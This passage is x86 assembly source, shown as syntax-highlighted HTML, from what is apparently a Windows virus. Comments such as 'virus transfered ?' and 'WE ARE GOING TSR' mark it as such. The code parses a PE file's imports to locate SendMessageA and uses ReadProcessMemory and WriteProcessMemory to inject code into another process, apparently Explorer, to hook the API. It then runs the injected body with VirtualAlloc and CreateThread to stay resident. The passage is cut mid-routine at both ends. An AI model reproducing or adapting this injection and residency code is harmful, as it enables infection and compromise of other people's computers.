</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; okay now it's ampped</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get PE blablabla</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get look if there's dead rooms</span><span class="sc0">
                        </span><span class="sc1">; in PE memory</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0f8h</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; there should be , memory</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">skiploading</span><span class="sc0">             </span><span class="sc1">; is rounded by minimum 4K of </span><span class="sc0">
                        </span><span class="sc1">; mem on intel compus</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ourmemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; we got memomry</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">              </span><span class="sc1">; now we scan the import</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">scannexta</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skiploading</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">                  </span><span class="sc1">; we get adress name</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'RESU'</span><span class="sc0">              </span><span class="sc1">; check user32.dll</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wegotitit</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'resu'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">scannexta</span><span class="sc0">

</span><span class="sc5">wegotitit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; and then we look</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">                  </span><span class="sc1">; for api import list</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; and make a loop to do</span><span class="sc0">

</span><span class="sc5">boucleme</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skiploading</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'dneS'</span><span class="sc0">            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">boucleme</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'sseM'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">boucleme</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'Aega'</span><span class="sc0">      </span><span class="sc1">; looking For SendMessageA</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">boucleme</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checktest</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; intenal flag</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; we got the rva of</span><span class="sc0">
                            </span><span class="sc1">; the api!!!</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; okay, then we save it</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">]</span><span class="sc0">  
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; NumbWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pseudoreturn</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; process base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; processID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadProcessMemory</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; check for residency</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pseudoreturn</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">  
</span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">skiploading2</span><span class="sc0">                </span><span class="sc1">; we are resident!</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">]</span><span class="sc0">  
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; NumbWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">finannoy</span><span class="sc4">-</span><span class="sc5">AnnoyingCode</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AnnoyingCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ourmemory</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; process base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; processID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; save our gotta resident code</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">]</span><span class="sc0">  
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; NumbWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ourmemory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; process base</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; processID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; WE ARE GOING TSR -)</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; running the remote thread ,but how</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">skiploading</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close_file</span><span class="sc0">          </span><span class="sc1">; that's lame, I didn't unmaped</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fini0</span><span class="sc0">               </span><span class="sc1">; the file, but who care ?</span><span class="sc0">
    
</span><span class="sc5">skiploading2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Residency2</span><span class="sc0">          </span><span class="sc1">; we where loaded in explorer</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">skiploading</span><span class="sc0">         </span><span class="sc1">; mem, so do it</span><span class="sc0">

</span><span class="sc5">AnnoyingCode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fakejump</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">Pseudoreturn</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">          </span><span class="sc1">; push apis offset</span><span class="sc0">

</span><span class="sc5">retback</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">nop</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdel</span><span class="sc0">              </span><span class="sc1">; get delta pointer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">retback</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0"> </span><span class="sc1">; lock api access</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00100000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(((</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">0111b</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">11111111111111111111111111111000b</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocT</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; allocate memory</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checktest</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checktest2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Loadingresult</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThreadT</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; creating our task</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getdel</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMeThere</span><span class="sc0">

</span><span class="sc5">GetMeThere</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetMeThere</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Loadingresult</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdel</span><span class="sc0">      </span><span class="sc1">; this task wait for memory transerf</span><span class="sc0">
                    </span><span class="sc1">; work like a benny's fiber but wait</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checktest2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; for both</span><span class="sc0">
                                </span><span class="sc1">; part to start</span><span class="sc0">
</span><span class="sc5">testme</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checktest</span><span class="sc4">],</span><span class="sc12">'yakO'</span><span class="sc0">    </span><span class="sc1">; Okay</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">testme</span><span class="sc0">
        
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">residencystart</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; here we go</span><span class="sc0">

</span><span class="sc5">checktest</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; memory allocated ?</span><span class="sc0">
</span><span class="sc5">checktest2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; virus transfered ?</span><span class="sc0">
                            </span><span class="sc1">; -&gt; Thread begin</span><span class="sc0">
</span><span class="sc5">CreateThreadT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; yeeeeeeeeepeee</span><span class="sc0">
</span><span class="sc5">VirtualAllocT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">finannoy</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">RVA2Offset</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; this routine</span><span class="sc0">
                            </span><span class="sc1">; is supposed to </span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                          </span><span class="sc1">; transfer RVA to</span><span class="sc0">
                            </span><span class="sc1">; an offset in memory </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; map, usefull to play</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                      </span><span class="sc1">; with loaded process</span><span class="sc0">
                            </span><span class="sc1">; with only disk </span><span class="sc0">
</span><span class="sc5">scannext99</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; image</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                      </span><span class="sc1">; it's a bit based on</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; axelle virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fino</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">scannext99</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">scannext99</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
